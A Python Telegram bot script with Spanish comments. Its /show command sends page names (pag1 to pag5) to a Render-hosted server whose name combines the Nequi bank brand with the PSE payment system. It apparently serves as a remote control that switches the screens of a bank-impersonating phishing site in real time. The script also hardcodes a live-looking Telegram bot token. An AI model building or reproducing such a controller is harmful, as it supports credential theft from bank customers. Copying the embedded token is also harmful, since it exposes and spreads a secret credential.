import telebot
import requests
import os
import signal
import sys
import time

# Token de Telegram
TOKEN = "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c"
bot = telebot.TeleBot(TOKEN)

# URL del servidor
SERVER_URL = "https://nequipacpseapp.onrender.com/setPage"

# 🛑 Eliminar Webhook (evita conflictos con polling())
bot.remove_webhook()
time.sleep(1)  # Esperar un segundo antes de iniciar el bot

# 🎯 Comando /start
@bot.message_handler(commands=["start"])
def send_welcome(message):
    bot.reply_to(message, "¡Hola! Usa /show seguido de una página para cambiar. Ejemplo: /show pag1")

# 🎯 Comando /show
@bot.message_handler(commands=["show"])
def cambiar_pagina(message):
    try:
        partes = message.text.split()
        if len(partes) < 2:
            bot.reply_to(message, "⚠️ Uso correcto: /show pag1|pag2|pag3|pag4|pag5")
            return
        
        pagina = partes[1].lower()
        paginas_validas = {"pag1", "pag2", "pag3", "pag4", "pag5"}

        if pagina in paginas_validas:
            response = requests.post(SERVER_URL, json={"pagina": pagina}, timeout=5)
            if response.status_code == 200:
                bot.reply_to(message, f"✅ Página cambiada a {pagina}")
            else:
                bot.reply_to(message, f"❌ Error: {response.status_code} - {response.text}")
        else:
            bot.reply_to(message, "⚠️ Página inválida. Usa: /show pag1|pag2|pag3|pag4|pag5")
    
    except requests.exceptions.Timeout:
        bot.reply_to(message, "⏳ El servidor tardó demasiado en responder. Intenta de nuevo.")
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f"❌ Error de conexión: {str(e)}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error inesperado: {str(e)}")

# 🎯 Manejo de mensajes desconocidos
@bot.message_handler(func=lambda message: True)
def manejar_errores(message):
    bot.reply_to(message, "⚠️ Comando no reconocido. Usa /show seguido de una página. Ejemplo: /show pag1")

# 🛑 Función para detener el bot correctamente
def detener_bot(signum, frame):
    print("\n🛑 Deteniendo el bot...")
    bot.stop_polling()
    sys.exit(0)

# Capturar señal de interrupción (Ctrl+C)
signal.signal(signal.SIGINT, detener_bot)

# 🚀 Iniciar el bot
print("✅ Bot iniciado. Esperando comandos... mis cabrones")
bot.polling(skip_pending=True, none_stop=True)